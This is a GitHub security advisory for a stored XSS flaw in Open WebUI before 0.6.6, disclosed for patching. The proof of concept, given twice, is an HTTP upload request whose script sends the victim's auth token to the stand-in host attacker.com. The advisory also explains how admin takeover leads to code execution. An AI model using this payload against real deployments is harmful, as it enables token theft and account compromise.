# [M] Open WebUI  allows limited stored XSS vila uploaded html file

## Summary
Severity: Medium
Advisory: GHSA-8gh5-qqh8-hq3x
CVE: CVE-2025-46571
CWE: CWE-79, CWE-87
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-07-07
Source: https://github.com/advisories/GHSA-8gh5-qqh8-hq3x
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.6.6

## Details
### Summary
Low privileged users can upload HTML files which contain JavaScript code via the `/api/v1/files/` backend endpoint. This endpoint returns a file id, which can be used to open the file in the browser and trigger the JavaScript code in the user's browser. Under the default settings, files uploaded by low-privileged users can only be viewed by admins or themselves, limiting the impact of this vulnerability.

### Details

The following HTTP request can be sent to the backend server to upload a file with the contents:
`<script>fetch("https://attacker.com/?token=" + localStorage.getItem("token"))</script>`

```http
POST /api/v1/files/ HTTP/1.1
Host: localhost:8080
Content-Length: 286
authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ijg2NjA1NTZhLTc0OWQtNDdmNS1iMjgwLWRiYzkyYzc2ZjM1NiJ9.4cImklYQUVi3dlXmRtQwdZKEleu0cq4tXompMod8X2U
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr0PnRBBHKXD9UEdm

------WebKitFormBoundaryr0PnRBBHKXD9UEdm
Content-Disposition: form-data; name="file"; filename="test.html"
Content-Type: text/html

<h1>padding</h1>
<script>fetch("https://attacker.com/?token=" + localStorage.getItem("token"))</script>
------WebKitFormBoundaryr0PnRBBHKXD9UEdm--
```

Note the `filename="test.html"` , `Content-Type: text/html`, and `<h1>padding</h`> in the request's body. These are important because some form of sanitization or filtering was observed which caused errors when uploading an html file that only conained a `<script>` tag. 

The backend server responds to the above request with JSON data that contains an `id` parameter. 

![image](https://github.com/user-attachments/assets/ac15e108-d385-4e58-b29a-eb79aafbffda)

This ID can be used to view the uploaded file in the browser at `<Backend_URL>/api/v1/files/<file_id>/content/html`

Because of the authorization checks done on lines https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/files.py#L434-L438, this file can only be viewed by admins and the user that uploaded it, but not by other low-privileged users, thus limiting the imact of this stored XSS vulnerability.

### PoC

First, upload an html containing JavaScript code to the backend server using the following HTTP request:
```http
POST /api/v1/files/ HTTP/1.1
Host: localhost:8080
Content-Length: 286
authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ijg2NjA1NTZhLTc0OWQtNDdmNS1iMjgwLWRiYzkyYzc2ZjM1NiJ9.4cImklYQUVi3dlXmRtQwdZKEleu0cq4tXompMod8X2U
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr0PnRBBHKXD9UEdm

------WebKitFormBoundaryr0PnRBBHKXD9UEdm
Content-Disposition: form-data; name="file"; filename="test.html"
Content-Type: text/html

<h1>padding</h1>
<script>fetch("https://attacker.com/?token=" + localStorage.getItem("token"))</script>
------WebKitFormBoundaryr0PnRBBHKXD9UEdm--
```

Then copy the `id` from the response and use it to view the file in the browser at `<Backend_URL>/api/v1/files/<file_id>/content/html`


### Impact

Low privileged users can upload HTML files containing malicious JavaScript code. A link to such a file can be sent to an admin, and if clicked, will give the low-privileged user complete control over the admin's account, ultimately enabling RCE via functions, as described in https://github.com/open-webui/open-webui/security/advisories/GHSA-9f4f-jv96-8766

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-8gh5-qqh8-hq3x
- https://nvd.nist.gov/vuln/detail/CVE-2025-46571
- https://github.com/open-webui/open-webui/commit/ef2aeb7c0eb976bac759e59ac359c94a5b8dc7e0
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/files.py#L434-L438
- https://github.com/open-webui/open-webui/releases/tag/v0.6.6
